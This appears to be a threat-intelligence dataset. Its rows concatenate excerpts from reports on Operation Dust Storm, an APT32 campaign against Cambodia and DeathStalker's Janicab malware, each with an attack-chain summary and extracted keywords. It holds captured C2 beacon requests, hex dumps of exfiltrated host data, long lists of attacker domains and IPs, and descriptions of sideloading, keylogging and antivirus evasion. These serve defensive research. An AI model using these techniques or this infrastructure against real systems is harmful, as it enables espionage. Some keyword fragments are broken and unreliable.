DriverLaunch, DriverProc • Mimics the resource version information of a legitimate Realtek Semiconductor Module, or Nvidia Module,or Synaptics module • PE checksum of zeroHOST-BASED INDICATORS File System Modifications: • All observed backdoor locations:• %WINDIR%\system32\cryptpol.dll • All Users %AppData%\cryptpol.dll • All Users %AppData%\wdd.ocx • All Users %AppData%\athmgmt.dll • All Users %AppData%\rasctl.dll • All Users %AppData%\rtcomdll.dll • All Users %AppData%\msnt.dll• May create randomly named temporary files in %AppData% ending in .tmp • May create temporary files in the %temp% directory that begin with the letters “tmp”Registry Modifications: • Will create all necessary keys to configure the backdoor to run as a ServiceDLL, including redefining ServiceMainto point to another of the backdoor’s exported functions - all observed service names are below:• CryptPol – Cryptography Policy Control Service • AtherosMgMt – Atheros Communications Management Service • WDDSVC – Windows Display Driver • RASCtrl – Remote Access Control Center16OPERATION DUST STORMOPERATION DUST STORM17NETWORK-BASED INDICATORS The backdoor communicates to the preconfigured C2 servers via HTTP POST and GET requests. The contents of the communications are compressed using the standard Zlib compression library (url During SPEAR’s limited testing, the User-Agent was always static and set to “Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)”.POST /EKTV/index.php?id=0 HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: bcsr.wordoscorp.com Accept: */* Cache-Control: no-cache Connection: Keep-Alive Content-Length: 498 POST /EKTV/index.php?id=3580792616 HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: bcsr.wordoscorp.com Accept: */* Cache-Control: no-cache Connection: Keep-Alive Content-Length: 490Figure 25: Initial POST Requests Sent by the Zlib Backdoor00000000 1C 12 00 00 1E 12 00 00 FF FF FF FF 40 05 00 00 ÿÿÿÿ@ 00000016 FE CD 18 9C 55 00 53 00 45 00 52 00 2D 00 44 00 þÍ.œU.S.E.R.-.D. 00000048 35 00 00 00 DA D2 90 7C DC FF B8 00 20 E9 90 7C 5 ÚÒ|Üÿ¸. é| 00000064 68 F6 90 7C FF FF FF FF 61 F6 90 7C EE D4 DD 77 hö|ÿÿÿÿaö|îÔÝw 00000080 00 00 00 00 E0 CC B8 00 00 00 00 00 F9 D4 DD 77 àÌ¸ ùÔÝw 00000096 00 00 00 00 00 00 00 00 FC 00 00 00 00 00 00 00 ü 00000112 20 00 00 00 00 00 00 00 9E 7E E5 14 52 55 D1 01 ž~å.RUÑ. 00000128 00 00 00 00 10 00 00 00 53 00 2D 00 31 00 2D 00 S.-.1.-. 00000144 35 00 2D 00 9C B2 B8 00 6E D9 90 7C DC B1 B8 00 5.-.œ²¸.nÙ|Ü±¸. 00000160 98 B1 B8 00 5C F6 90 7C 61 F6 90 7C DC B1 B8 00 ˜±¸.\ö|aö|Ü±¸. 00000176 6E D9 90 7C 9C B2 B8 00 74 B1 B8 00 7A D9 90 7C nÙ|œ²¸.t±¸.zÙ| 00000192 DC FF B8 00 20 E9 90 7C 68 F6 90 7C FF FF FF FF Üÿ¸. é|hö|ÿÿÿÿ 00000208 61 F6 90 7C EB 6F DD 77 34 00 00 C0 00 00 00 00 aö|ëoÝw4 À 00000224 D4 BA B8 00 F6 6F DD 77 C0 B2 B8 00 00 01 00 00 Ôº¸.öoÝwÀ²¸ 00000240 B8 B2 B8 00 B0 B2 B8 00 00 01 00 00 D4 BA B8 00 ¸²¸.°²¸ Ôº¸. 00000256 DC B1 B8 00 00 00 00 00 00 00 00 00 00 00 00 00 Ü±¸ 00000272 34 00 00 C0 0C B2 B8 00 5C F6 90 7C 61 F6 90 7C 4 À.²¸.\ö|aö| 00000288 00 00 00 00 8C B2 B8 00 2D F6 90 7C E8 B1 B8 00 Œ²¸.-ö|è±¸. 00000304 EC B1 B8 00 54 B2 B8 00 20 E9 90 7C 68 F6 90 7C ì±¸.T²¸. é|hö|(con’t)00000320 FF FF FF FF 61 F6 90 7C 4E 6A DD 77 87 6A DD 77 ÿÿÿÿaö|NjÝw‡jÝw 00000336 D4 B2 B8 00 03 00 00 80 FC 00 00 00 18 00 00 00 Ô²¸ €ü 00000352 FC 00 00 00 8C B2 B8 00 40 00 00 00 00 00 00 00 ü Œ²¸.@ 00000368 00 00 00 00 8A 00 8A 00 D4 B2 B8 00 88 B2 B8 00 Š.Š.Ô²¸.ˆ²¸. 00000384 00 00 00 00 18 B2 B8 00 84 B2 B8 00 DC FF B8 00 ²¸.„²¸.Üÿ¸. 00000400 78 17 DF 77 90 6A DD 77 FF FF FF FF 87 6A DD 77 x.ßwjÝwÿÿÿÿ‡jÝw 00000416 95 6B DD 77 13 BD 00 00 A8 B2 B8 00 8B 70 DD 77 •kÝw.½ ¨²¸.‹pÝw 00000432 00 01 00 00 9C B2 B8 00 C0 B2 B8 00 D4 BA B8 00 œ²¸.À²¸.Ôº¸. 00000448 B8 B2 B8 00 B0 B2 B8 00 00 08 00 00 72 00 00 00 ¸²¸.°²¸ r 00000464 00 00 00 00 1A 00 1C 00 FA CF 90 7C 03 6C DD 77 úÏ|.lÝw 00000480 00 01 00 00 00 00 00 00 BC B2 B8 00 AB 6C DD 77 ¼²¸.«lÝw 00000496 C4 B2 B8 00 A8 CD B8 00 7A DD 00 10 00 00 00 00 Ä²¸.¨Í¸.zÝ 00000512 58 FC B3 00 70 50 02 10 00 00 00 00 53 00 2D 00 Xü³.pP S.-. 00000528 31 00 2D 00 35 00 2D 00 31 00 38 00 89 5D 95 10 1.-.5.-.1.8.‰]•. 00000544 1C 01 00 00 05 00 00 00 01 00 00 00 28 0A 00 00 ( 00000560 02 00 00 00 53 00 65 00 72 00 76 00 69 00 63 00 S.e.r.v.i.c. 00000576 65 00 20 00 50 00 61 00 63 00 6B 00 20 00 33 00 e. .P.a.c.k. .3. 00000592 00 00 5C 00 43 00 75 00 72 00 72 00 65 00 6E 00 \.C.u.r.r.e.n. 00000608 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 t.V.e.r.s.i.o.n. 00000624 5C 00 49 00 6E 00 74 00 65 00 72 00 6E 00 65 00 \.I.n.t.e.r.n.e. 00000640 74 00 20 00 53 00 65 00 74 00 74 00 69 00 6E 00 t. .S.e.t.t.i.n. 00000656 67 00 73 00 00 00 00 00 00 00 00 00 00 00 00 00 g.s ---Truncated--- 00000816 00 00 00 00 03 00 00 00 00 01 01 00 00 00 00 00 00000832 53 00 59 00 53 00 54 00 45 00 4D 00 00 00 00 00 S.Y.S.T.E.M --Truncated--- 00001264 00 00 00 00 00 00 00 00 00 00 00 00 E0 B5 B8 00 àµ¸. 00001280 99 51 91 7C 08 B6 B8 00 E4 00 08 00 04 00 00 00 ™Q‘|.¶¸.ä 00001296 D4 00 08 00 00 00 08 00 20 B6 B8 00 8B 53 91 7C Ô ¶¸.‹S‘| 00001312 08 B6 B8 00 D4 00 08 00 00 00 00 00 10 00 00 00 .¶¸.Ô 00001328 00 00 00 00 A4 B6 B8 00 7A CF 90 7C 7B 8B 91 7C ¤¶¸.zÏ|{‹‘| 00001344 FF FF FF FF 40 B6 B8 00 01 00 00 00 D7 07 00 00 ÿÿÿÿ@¶¸ × Figure 26: Decompressed Contents of Initial POST RequestThe hostname, context the backdoor was running under, operating system information, and user information were transmitted back to the C2 during a controlled test.DETAILS Anecdotal evidence suggests the attackers made few modifications to the backdoors themselves and instead simply updated the configuration information as needed. As a result, most of the backdoors identified had a PE checksum mismatch between the stated value and calculated value. The backdoor provided the attacker with the ability to upload and download files, enumerate files and drives, enumerate system information, enumerate and manipulate Windows services, enumerate and impersonate logon sessions, mimic keystrokes and mouse input, capture screenshots, and execute shell commands. The backdoor itself contained very few unique plain-text strings or any other type of identifying information outside of the Import Table. The backdoor would initialize strings of interest on the stack by pushing one character at a time; this method has become increasingly common among malware authors to avoid antivirus heuristic methods. The backdoor’s configuration information was stored Zlib compressed within the binary with the size of the compressed data saved as a double word right before the start of the header “0x78 0x9C”. The decompressed data contained the Windows service name, Windows display18OPERATION DUST STORMOPERATION DUST STORM19name, and a description for the service. It also contained the filename the backdoor would use, the domain names and ports to beacon on, and the internal corporate proxy to use.APPENDIX00000000 43 00 72 00 79 00 70 00 74 00 50 00 6F 00 6C 00 C.r.y.p.t.P.o.l. --Truncated--- 00000060 00 00 00 00 43 00 72 00 79 00 70 00 74 00 6F 00 C.r.y.p.t.o. 00000070 67 00 72 00 61 00 70 00 68 00 79 00 20 00 50 00 g.r.a.p.h.y. .P. 00000080 6F 00 6C 00 69 00 63 00 79 00 20 00 43 00 6F 00 o.l.i.c.y. .C.o. 00000090 6E 00 74 00 72 00 6F 00 6C 00 20 00 53 00 65 00 n.t.r.o.l. .S.e. 000000A0 72 00 76 00 69 00 63 00 65 00 00 00 00 00 00 00 r.v.i.c.e 000000B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 --Truncated--- 00000120 00 00 00 00 00 00 00 00 00 00 00 00 50 00 72 00 P.r. 00000130 6F 00 76 00 69 00 64 00 65 00 20 00 74 00 68 00 o.v.i.d.e. .t.h. 00000140 65 00 20 00 70 00 6F 00 6C 00 69 00 63 00 79 00 e. .p.o.l.i.c.y. 00000150 2D 00 62 00 61 00 73 00 65 00 64 00 20 00 62 00 -.b.a.s.e.d. .b. 00000160 61 00 73 00 69 00 63 00 20 00 63 00 72 00 79 00 a.s.i.c. .c.r.y. 00000170 70 00 74 00 6F 00 67 00 72 00 61 00 70 00 68 00 p.t.o.g.r.a.p.h. 00000180 79 00 20 00 73 00 65 00 72 00 76 00 69 00 63 00 y. .s.e.r.v.i.c. 00000190 65 00 2E 00 49 00 66 00 20 00 74 00 68 00 69 00 e I.f. .t.h.i. 000001A0 73 00 20 00 73 00 65 00 72 00 76 00 69 00 63 00 s. .s.e.r.v.i.c. 000001B0 65 00 20 00 69 00 73 00 20 00 73 00 74 00 6F 00 e. .i.s. .s.t.o. 000001C0 70 00 70 00 65 00 64 00 2C 00 20 00 74 00 68 00 p.p.e.d.,. .t.h. 000001D0 65 00 20 00 63 00 72 00 79 00 70 00 74 00 6F 00 e. .c.r.y.p.t.o. 000001E0 67 00 72 00 61 00 70 00 68 00 79 00 20 00 70 00 g.r.a.p.h.y. .p. 000001F0 6F 00 6C 00 69 00 63 00 79 00 20 00 63 00 6F 00 o.l.i.c.y. .c.o. 00000200 6E 00 74 00 72 00 6F 00 6C 00 20 00 73 00 65 00 n.t.r.o.l. .s.e. 00000210 72 00 76 00 69 00 63 00 65 00 20 00 77 00 69 00 r.v.i.c.e. .w.i. 00000220 6C 00 6C 00 20 00 6E 00 6F 00 74 00 20 00 66 00 l.l. .n.o.t. .f. 00000230 75 00 6E 00 63 00 74 00 69 00 6F 00 6E 00 20 00 u.n.c.t.i.o.n. . 00000240 70 00 72 00 6F 00 70 00 65 00 72 00 6C 00 79 00 p.r.o.p.e.r.l.y. 00000250 2E 00 20 00 00 00 00 00 00 00 00 00 00 00 00 00 ---Truncated--- 00000380 00 00 00 00 43 00 72 00 79 00 70 00 74 00 50 00 C.r.y.p.t.P. 00000390 6F 00 6C 00 2E 00 64 00 6C 00 6C 00 00 00 00 00 o.l d.l.l ---Truncated--- 00000580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00000590 62 63 73 72 2E 77 6F 72 64 6F 73 63 6F 72 70 2E bcsr.wordoscorp. 000005A0 63 6F 6D 00 00 00 00 00 00 00 00 00 00 00 00 00 com ---Truncated--- 00000680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 73 s 00000690 50 00 00 00 6A 6E 68 73 2E 74 6F 6D 73 68 61 72 P jnhs.tomshar 000006A0 64 70 63 2E 63 6F 6D 00 00 00 00 00 00 00 00 00 dpc.com ---Truncated--- 00000780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00000790 00 00 00 FF BB 01 00 00 4B 54 56 59 00 EE 12 00 ÿ» KTVY.î 000007A0 5F F1 C1 54 C8 AF 00 00 D7 07 00 00 01 00 00 00 _ñÁTÈ¯ × 000007B0 00 00 00 00 20 8E 01 00 5B 00 52 00 45 00 44 00 Ž [.R.E.D. 000007C0 41 00 43 00 54 00 45 00 44 00 5D 00 00 00 00 00 A.C.T.E.D.] 10bfym.8800.org 10kjd.amazonwikis.com 1stone.zapto.org 323332.3322.org aqyj.tomshardpc.com auto.glkjcorp.com b3fk.sfcorporation.com bdgs.amazonwikis.com bdt.wordoscorp.com bfym2.amazonwikis.com blog.adobeus.com blog.amazonwikis.com blog.sfcorporation.com blog.wih365.com books.sfcorporation.com bybf.amazonwikis.com bygs.sfcorporation.com cbgs.sfcorporation.com cdic.sfcorporation.com cxks.amazonwikis.com d2ch.sfcorporation.com dgfk.sfcorporation.com dghk.sfcorporation.com down.adobeus.com ekzy.gmnspace.com elecarrow.com en.amazonwikis.com exemail.net flash.adobeus.com fngs.adobeus.com fsw.adobeus.com gde.moviestops.com ghlc.adobeus.com guhk.moviestops.com health.dns1.us hglg.wordoscorp.com hjxt.sfcorporation.com hkabinc.com hkmj.amazonwikis.com home.sfcorporation.com hsjs.wordoscorp.com hsy.moviestops.com iccbhhjdgb.adobeus.com image.amazonwikis.com image.hkabinc.com imnothk.8800.org jggs.sfcorporation.com jiaoshow.9966.org jnhs.tomshardpc.com jrfw.amazonwikis.com jrgs.sfcorporation.com js.95nb.co.cc js.adobekr.com js.amazonwikis.com js.exemail.net kb1gs.sfcorporation.com kersperskey.8800.orgkj.uuvod.net krgt.tomshardpc.com lhbf.adobeus.com login.adobekr.com login.live.adobekr.com login.live.wih365.com login.wih365.com mail.adobekr.com mail.glkjcorp.com mail.projectscorp.net mailxss.9966.org mesdata.8866.org microbing.oicp.net microses.9966.org microupdate.8800.org microwmies.oicp.net mobile.yqby.wordoscorp.com mocrosoftds.xicp.net modeless.3322.org movie.sfcorporation.com moviestops.com msejake.7766.org msevpn.3322.org music.sfcorporation.com net.amazonwikis.com news.amazonwikis.com news.elecarrow.com news.sfcorporation.com nttvps.gnway.net pic.elecarrow.com pic.glkjcorp.com pic.hkabinc.com pics.adobeus.com pics.amazonwikis.com projectscorp.net qsgs.sfcorporation.com rbjg.moviestops.com rbjg.moviestops.com rbny.sfcorporation.com rbxr.tomshardpc.com rjby.tomshardpc.com rjjh.wordoscorp.com rmax.amazonwikis.com ruag.amazonwikis.com sane.adobeus.com sdj2b.3322.org sfcorporation.com sgad.sfcorporation.com showjiao.imzone.in showshow.7766.org smgs.amazonwikis.com smtp.adobekr.com sport.sfcorporation.com ssl.elecarrow.com ssl.exemail.net ssl.gmnspace.com ssl.projectscorp.net ssl.sfcorporation.com sslmails.com sybf.adobeus.com tcgs.adobeus.com tdfg.moviestops.comtech.amazonwikis.com test.uuvod.net tomshardpc.com tqsj.sfcorporation.com tzcl.sfcorporation.com tzz.exemail.net up.adobekr.com update.adobekr.com update.adobeus.com uworks.sfcorporation.com v.exemail.net video.sfcorporation.com vod.amazonwikis.com vod.sfcorporation.com vpntemp.3322.org wbjs.sfcorporation.com web.sfcorporation.com wed.amazonwikis.com wsxg.moviestops.com www.adobeus.com www.projectscorp.net www.wih365.com wxpb.sfcorporation.com xjgs.sfcorporation.com xkgs.sfcorporation.com xrgt.tomshardpc.com xrgt.wordoscorp.com yahoo.gmnspace.com yahoomail.adobeus.com ygfk.sfcorporation.com yhkj.sfcorporation.com yjbf.amazonwikis.com yjxy.sfcorporation.com yqby.wordoscorp.com zdzl.sfcorporation.com ziper.imbbs.in zpgx.tomshardpc.comAll Known IP Addresses: 2010 C2 Infrastructure: IP Addresses: Domains: bfym2.amazonwikis.com books.sfcorporation.com imnothk.8800.org jiaoshow.9966.org kb1gs.sfcorporation.com kersperskey.8800.org mailxss.9966.org microses.9966.org microupdate.8800.org microwmies.oicp.net mocrosoftds.xicp.net modeless.3322.org yhkj.sfcorporation.com 2011 C2 Infrastructure: IP Addresses: 323332.3322.org adobekr.com js.95nb.co.cc js.adobekr.com login.live.adobekr.com login.live.wih365.com mesdata.8866.org mocrosoftds.xicp.net msejake.7766.org msevpn.3322.org sdj2b.3322.org2013 C2 Infrastructure: IP Addresses: Domains: en.amazonwikis.com mail.projectscorp.net news.sfcorporation.com pic.elecarrow.com qsgs.sfcorporation.com rbjg.moviestops.com rbny.sfcorporation.com smtp.adobekr.com ssl.gmnspace.com ssl.projectscorp.net update.adobekr.com yahoo.gmnspace.com yahoomail.adobeus.com2012 C2 Infrastructure: IP Addresses: Domains: auto.glkjcorp.com gde.moviestops.com22OPERATION DUST STORMhealth.dns1.us mail.adobekr.com mail.glkjcorp.com nttvps.gnway.net qsgs.sfcorporation.com smtp.adobekr.com update.adobekr.com wsxg.moviestops.com wxpb.sfcorporation.com2014 C2 Infrastructure: IP Addresses: Domains: b3fk.sfcorporation.com bdt.wordoscorp.com bfym2.amazonwikis.com blog.sfcorporation.com books.sfcorporation.com bygs.sfcorporation.com cbgs.sfcorporation.com cdic.sfcorporation.com d2ch.sfcorporation.com dgfk.sfcorporation.com gde.moviestops.com guhk.moviestops.comrjby.tomshardpc.com rjjh.wordoscorp.com ssl.exemail.net ssl.gmnspace.com ssl.projectscorp.net tzz.exemail.net up.adobekr.com v.exemail.net wih365.com yqby.wordoscorp.com zpgx.tomshardpc.comhglg.wordoscorp.com hjxt.sfcorporation.com home.sfcorporation.com hsy.moviestops.com image.amazonwikis.com jggs.sfcorporation.com jrfw.amazonwikis.com jrgs.sfcorporation.com kb1gs.sfcorporation.com mail.projectscorp.net movie.sfcorporation.com music.sfcorporation.com news.elecarrow.com news.sfcorporation.com pic.elecarrow.com pic.glkjcorp.com pics.adobeus.com pics.amazonwikis.com qsgs.sfcorporation.com rbjg.moviestops.com rbny.sfcorporation.com ruag.amazonwikis.com sgad.sfcorporation.com smgs.amazonwikis.com sport.sfcorporation.com ssl.projectscorp.net ssl.sfcorporation.com tdfg.moviestops.com tqsj.sfcorporation.com tzcl.sfcorporation.com uworks.sfcorporation.com video.sfcorporation.com vod.sfcorporation.com wbjs.sfcorporation.com web.sfcorporation.com wed.amazonwikis.com wsxg.moviestops.com wxpb.sfcorporation.com xjgs.sfcorporation.com xkgs.sfcorporation.com yahoo.gmnspace.com ygfk.sfcorporation.com yhkj.sfcorporation.com2015 C2 Infrastructure: IP Addresses: Domains: ekzy.gmnspace.com hsjs.wordoscorp.com jnhs.tomshardpc.com mail.projectscorp.net news.elecarrow.com pic.glkjcorp.com rbjg.moviestops.comOPERATION DUST STORM23 ",1. Spear phishing emails sent to targets with weaponized documents exploiting vulnerabilities like CVE-2011-1255 and CVE-2011-0611. 2. Initial backdoors like Misdat are installed to do reconnaissance and open a beachhead. 3. Second stage tools like Gh0st RAT pulled down for further control and data theft. 4. Custom S-Type implants deployed in 2013-2014 for long-term surveillance. 5. Zlib backdoors propagate through service DLL hijacking to compromise additional hosts on the network. 6. Infrastructure pivots to focus on Japanese critical infrastructure targets in 2015 and beyond. 7. Android malware customized to steal data from mobile devices. ,valid_38,"['spear phishing', 'email', 'targets', 'Exploit', 'IE', 'CVE-2011-1255', 'CVE-2011-0611', 'Initial backdoors', 'Misdat', 'reconnaissance', 'second', 'Gh0st RAT', 'control', 'data', 'A T', 't.', 'us', 'S-Type', '2013-2014', 'e.', 'Zlib', 'DLL', 'compromise', 'addition', 'Host', 'S T', 'Japanese critical infrastructure', '2015', 'Android', 'malware', 's.']",spear phishing; email; targets; Exploit; IE; CVE-2011-1255; CVE-2011-0611; Initial backdoors; Misdat; reconnaissance; second; Gh0st RAT; control; data; A T; t.; us; S-Type; 2013-2014; e.; Zlib; DLL; compromise; addition; Host; S T; Japanese critical infrastructure; 2015; Android; malware; s..
"New APT32 Malware Campaign Targets Cambodian Government Recorded Future’s Insikt Group has discovered a new malware campaign targeting the Cambodian government using an Association of Southeast Asian Nations (ASEAN)-themed spearphish. Using Recorded Future RAT controller detections and Network Traffic Analysis, Insikt Group identified new operational infrastructure that we attribute to the Vietnamese state- sponsored threat activity group APT32, also known as OceanLotus. This assessment is also supported by the identification of several Cambodian victim organizations communicating with this infrastructure, and aligns with previous campaigns targeting these organizations. History Vietnam and Cambodia have a long history of conflict, dating back to the Sino-Vietnamese War of the 1970’s, when Vietnam began retaliatory attacks on China’s “little brother,” Cambodia. In 2017, Vietnam started strengthening its cyber warfare capabilities with the formation of APT32, which targeted ASEAN’s website during the 2017 annual summit, as well as targeting websites of ministries or government agencies in Cambodia, Lao PDR, and the Philippines. In recent years, the relationship between Vietnam and Cambodia hasdeteriorated in part because of China’s Belt and Road Initiatives (BRI) in the region. As Cambodian Prime Minister Hun Sen has grown closer to Chinese President Xi Jinping, the two have strengthened the partnerships between the two countries, pushing Vietnam out of critical regional cooperatives. Chinese investments in Cambodia include critical infrastructure, joint military exercises in the South China Sea, and a new property development just North of Ream Naval Base, strategically located on the Gulf of Thailand between Vietnam and Cambodia. New APT32 Infrastructure In June 2020, Insikt Group reported on new APT32 operational infrastructure identified through a proprietary method of tracking malware activity associated with APT32, such as METALJACK and DenisRAT. Using this same methodology, Insikt Group has continued to identify new, active APT32 IP addresses and associated domains. Insikt researchers discovered several samples that are a part of this campaign: Sample 1: The first sample is delivered via a malicious document titled, “បញ្ជីរាយនាមអនុព័ន្ធយោធាបរទេសនិងការិយាល័យសហប្រតិបត្តិ ការយោធាប្រចាំកម្ពុជា.docx~[.]exe”, which translates to “List of Foreign Military Attachments and Office of Military Cooperation in Cambodia.docx~[.]exe”. This sample, likely delivered via spearphishing, is aself-extracting archive (SFX) containing four files: 1. A legitimate executable signed by Apple (SoftwareUpdate.exe). 2. A related benign dynamic link library (DLL) file (SoftwareUpdateFiles.dll). 2 Recorded Future ® | www.recordedfuture.com 3. A malicious DLL (SoftwareUpdateFilesLocalized.dll). 4. A file named “SoftwareUpdateFiles.locale” containing encrypted shellcode. Upon execution of the SFX, the Apple executable loads the benign DLL before loading the malicious DLL, which is stored in the SoftwareUpdateFiles.Resources/en.lproj file path. The malicious DLL then extracts the encrypted shellcode from the SoftwareUpdateFile.locale file and decrypts and executes it, while displaying a decoy document to the user (an Microsoft Word document displaying an “activation error”), eventually loading the final payload. This loading process matches APT32 activity previously reported by Insikt Group and Ahnlab in relation to an APT32 sample referencing the 2020 ASEAN Summit. Further analysis of these artifacts for identification of the malware family is ongoing within Insikt Group and updates will be posted as more samples are analyzed. 3www.recordedfuture.com | Recorded Future ® Sample 2: A second sample, uploaded to a malware repository on October 22, 2020, uses this same loading process and communicates with one of the identified C2 domains, cloud.bussinesappinstant[.]com. In this sample, the SFX file is called “9_Programme_SOMCA-Japan_FINAL.docx~.exe”, likely in reference to the ASEAN Senior Officials Meeting for Culture and Arts (SOMCA), indicating APT32’s continued interest in the targeting of ASEAN and other member states. Decoy document utilized in this campaign shows a blank agenda for the “Seventh Meeting of the ASEAN Plus Japan Senior Officials on Culture and Arts. (Source: Recorded Future) This archive file drops the same “SoftwareUpdateFilesLocalized.dll” file seen in the previous sample. In addition to the TTP (tactics, techniques, procedures) and infrastructure overlaps, the malicious DLLs linked to this latest sample share an identical rich header and import hash seen in historical APT32 samples. Insikt Group identified further evidence of targeting of Cambodia through several IP addresses assigned to a Cambodian government organization regularly communicating with the APT32 C2 IP address 43.254.132[.]212. Recorded Future recommends using the following indicators of compromise from this campaign for detection and defense against this malware. Additionally, Insikt Group has provided a YARA rule for detection,below. For more insight into state-sponsored cyber threats, visitwww.recordedfuture.com/category/research/ ", 1. Spearphishing emails containing ASEAN-themed malicious documents are sent to Cambodian government targets. 2. The documents contain self-extracting archives that drop a benign DLL and malicious DLL. 3. The malicious DLL executes encrypted shellcode that decrypts and loads the final malware payload. 4. The payload communicates with the APT32 C2 server to receive commands and exfiltrate data. ,valid_70,"['ASEAN', 'Cambodian', 'the malicious DLL', 'encrypted shellcode', 'decrypts', 'communicates', 'APT32']",ASEAN; Cambodian; the malicious DLL; encrypted shellcode; decrypts; communicates; APT32.
"securelist.com /deathstalker-targets-legal-entities-with-new-janicab-variant/108131/ DeathStalker targets legal entities with new Janicab variantAuthorsGReAT“Dosen't matter how long you wait for the bus on a rainy day, X seconds was enough to get wet?”Just to clarify, the above subheading isn’t a normal quote, but a message that Janicab malware attempted to decode in its newest use of YouTube dead-drop resolvers (DDRs).While hunting for less common Deathstalker intrusions that use the Janicab malware family, we identified a new Janicab variant used in targeting legal entities in the Middle East throughout 2020, possibly active during 2021 and potentially extending an extensive campaign that has been traced back to early 2015 and targeted legal, financial, and travel agencies in the Middle East and Europe.Janicab was first introduced in 2013 as malware able to run on macOS and Windows operating systems. The Windows version has a VBscript-based implant as the final stage instead of a C#/PowerShell combo as observed previously in Powersing samples. The VBS-based implant samples we have identified to date have a range of version numbers, meaning it is still in development. Overall, Janicab shows the same functionalities as its counterpart malware families, but instead of downloading several tools later in the intrusion lifecycle, as was the case with EVILNUM and Powersing intrusions, the analyzed samples have most of the tools embedded and obfuscated within the dropper.1/14Interestingly, the threat actor continues to use YouTube, Google+, and WordPress web services as DDRs. However, some of the YouTube links observed are unlisted and go back to 2015, indicating a possible infrastructure reuse.Law firms and financial institutions continue to be most affected by Deathstalker. However, in the intrusions analyzed recently, we suspect that travel agencies are a new vertical that we haven’t previously seen being targeted by this threat actor.More information about Deathstalker is available to customers of Kaspersky Intelligence Reporting. Contact us: intelreports@kaspersky.com. Initial footholdWe determined that the initial infection method using a LNK-based dropper inside a ZIP archive, remained similar to previous campaigns using EVILNUM, Powersing, and PowerPepper, but each seems to focus on different phishing themes, as if each malware family is operated by different teams and/or intended for different types of victims. In a sample Janicab case, the decoy is an industrial corporate profile (hydraulics) matching the subject of a decoy used in previous PowerPepper intrusion. Based on our telemetry, the delivery mechanism remains spear-phishing.MD5File nameFile Hydraulica.lnk7.1 MBSID S-1-5-21-2529457200- 1000MAC address00:50:56:c0:00:08 / VMWare2/14Decoy document in LNK file3/14The LNK dropper’s metadata resembles many Powersing and Janicab implants we reported or publicly analyzed. Namely, the SID, font family, font size, screen buffer and window size, run window, and MAC address are similar.Despite Janicab and Powersing resembling each other a lot in terms of execution flow and the use of VBE and VBS, their LNKs are structured somewhat differently. In addition, newer Janicab variants have changed significantly in structure compared to older Janicab Windows variants from 2015. The new Janicab variants also embed a CAB archive containing several Python files and other artifacts used later in the intrusion lifecycle. Below is a high-level comparison between Powersing and the new and old Janicab variants.PowersingJanicab 1.2.9aJanicab 1.1.24/14LNK files structure comparison The execution flowOnce a victim is tricked into opening the malicious LNK file, a series of chained malware files are dropped. The LNK file has an embedded “Command Line Arguments” field that aims at extracting and executing an encoded VBScript loader (1.VBE). The latter will drop and execute another embedded and encoded VBScript (2.VBE) that will extract a CAB archive (cab.cab) containing additional resources and Python libraries/tools, and conclude the infection by extracting the last stage – a VBScript-based implant known as Janicab. The final stage will initiate persistence by deploying a new LNK file in the Startup directory and will start communicating with the DDR web services to gather the actual C2 IP address.Janicab (1.2.9a)MD5 Encoded VBE script 593 KB %userprofile%.VBEJanicab is a VBS-based malware implant that is mostly similar in functionality to its counterpart malware families, Powersing and EVILNUM. All have basic functionalities such as command execution, importing registry files, and the ability to download additional tools while maintaining persistence with high anti-VM and defense evasion.Since all three malware families share strong similarities, we will only discuss the interesting differences between Janicab versions in this section.Janicab can be considered a modular, interpreted-language malware. Meaning the threat actor is able to add/remove functions or embedded files; interpreted-language malware provides such flexibility with reasonably low effort. For example, in older variants, SnapIT.exe, a known tool used to capture screenshots, was embedded, dropped and executed at intervals. This tool was replaced in later variants with other custom-built tools that do the same job. We’ve also seen audio recording capabilities in older variants, but not in later variants.In newer variants, we started seeing the threat actor embed a DLL-based keylogger or screen capture utility that is invoked using the ‘run_dll_or_py’ function. Interestingly, according to our Kaspersky Threat Attribution Engine (KTAE), the keylogger is very similar to another keylogger used in previous Powersing intrusions we reported and came under the name ‘AdobeUpdater.dll’. In Powersing intrusions, the DLL was fetched later in the intrusion cycle from a secondary C2 server. However, in Janicab intrusions, it was mostly embedded as a HEX bytes array, or inside CAB files as extra resources. We’re aware of eight different Janicab versions: 1.0.8, 1.1.2, 1.1.4, 1.2.5, 1.2.7, 1.2.8, 1.2.9a, 1.3.2. Janicab malware evolution5/14A further comparison of the different Janicab versions shows that additional functions were added throughout the malware development cycle, while specific functions were maintained. The table below shows interesting new functions that were introduced throughout the development of several variants according to the actor’s requirements and/or to evade security controls:Function name Function downFile(args) function GetKl(kl)Function runCmd(cmd, cmdType)Function run_dll_or_py(arg1, arg2)function starterFile)Function isMalwb()Function HandleCCleaner()Function RunIeScript()Function getAV()Brief description Checks for a list of processes indicating malware analysis or process debugging Points to respective browser location and deletes its cookies Used to download files from C2 and save them to disk Gets keylogger data, base64 encodes it, then sends it to C2 Function facilitating command execution using CMD.exe or PowerShell.exe Used to execute Python or DLL files while using two arguments; arg1 is the DLL path and arg2 is the DLL exported function name (MyDllEntryPoint)Used to register the victim for the first time at the C2; perform persistence actions and install Microsoft Sync Services.lnk in system startup folder and registry HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinlogonFunction to check if MalwareBytes is installed. Similar functions were seen in other variants that check for other AV products Checks if CCleaner is installed by checking system registry, and deletes the registry entries accordingly Runs ie.vbe script using CScript.exe to ensure no residual Internet Explorer instances exists after C2 communication uses IE hidden browser Gets a list of installed AV productsStarting with version 1.0.8, Janicab VBS implants had several files embedded in the form of byte arrays. These are usually registry, VBE, PE EXE, or DLL files. In recent samples, while we still see embedded byte arrays for such resources, much of the extra resources were placed inside a CAB archive file that is dropped in the Stage-1 process.Below are noteworthy dropped files and their descriptions:Filename K.dllDescription Named Stormwind after a directory it creates, it’s a DLL-based keylogger that enumerates system locale, timezone info, and sets a global hook to capture keystrokes. It writes keystrokes with timestamps to a log file named log.log under the \AppData\Roaming\Stormwind directory. It watches for killKL.txt6/14under 